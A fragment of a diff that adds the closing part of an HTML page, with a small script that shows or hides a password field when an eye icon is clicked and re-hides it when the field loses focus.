+          </section>
+        </footer>
+      </div>
+    </div>
+    <script>
+      const eyeIcon = document.getElementById("eye-icon");
+      const passwordInput = document.getElementById("password");
+      if (eyeIcon) {
+        eyeIcon.addEventListener("mousedown", (event) => {
+          event.preventDefault();
+        });
+
+        eyeIcon.addEventListener("click", function () {
+          if (eyeIcon.children[0].className === "fa fa-eye-slash") {
+            eyeIcon.children[0].className = "fa fa-eye";
+            passwordInput.type = "text";
+          } else {
+            eyeIcon.children[0].className = "fa fa-eye-slash";
+            passwordInput.type = "password";
+          }
+
+          passwordInput.focus();
+          setTimeout(() => {
+            const length = passwordInput.value.length;
+            passwordInput.setSelectionRange(length, length);
+          }, 0);
+        });
+      }
+
+      if (passwordInput) {
+        passwordInput.onblur = () => {
+          if (passwordInput.type !== "password") {
+            eyeIcon.children[0].className = "fa fa-eye-slash";
+            passwordInput.type = "password";
+          }
+        };
+      }
+    </script>
+  </body>
+</html>
